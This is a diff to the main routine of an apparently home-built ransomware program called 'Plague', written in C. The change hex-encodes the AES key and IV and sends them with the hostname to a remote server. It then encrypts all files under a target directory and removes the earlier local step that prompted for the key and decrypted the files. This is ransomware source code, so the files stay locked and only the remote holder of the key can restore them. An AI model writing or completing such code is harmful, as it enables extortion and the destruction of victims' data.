@@ -118,8 +118,8 @@ int main()
     unsigned char iv[IV_SIZE];              // A 128 bit IV
     //char *path = strdup("C:\\");                                  // Windows
     char *path = strdup("/home/kali/CLionProjects/Plague/test"); // Linux
-    char *encoded_key;
-    unsigned char *decoded_key;
+    char *encoded_key, *encoded_iv;
+    int check = 0;
 
     // TODO rand_seed() to set unpredictable random
     //RAND_seed(&buf, 10);
@@ -133,22 +133,18 @@ int main()
     // Send key and IV to server
     // Encode in hexa
     encoded_key = encode_hex(key, KEY_SIZE);
-    send_key(encoded_key, get_hostname());
+    encoded_iv = encode_hex(iv, IV_SIZE);
+    check = send_key(encoded_key, encoded_iv, get_hostname());
+    if (check == 1)
+        return 0;
 
     // Encrypt
     apply_for_all(path, &encrypt_file, key, iv);
-
-    printf("Decription key :\n");
-    scanf("%s", encoded_key);
-    decoded_key = decode_hex(encoded_key, KEY_SIZE);
-    // BIO_dump_fp (stdout, (const char *)decoded_key, (int)KEY_SIZE); // DEBUG
-    apply_for_all(path, &decrypt_file, decoded_key, iv);
 
     free(path);
     memset(key, 0, KEY_SIZE);                                   // Erase memory where was store the key
     memset(encoded_key, 0, KEY_SIZE * 2);
     free(encoded_key);
-    free(decoded_key);
     //system("PAUSE");                                             // Windows
     return 0;
 }
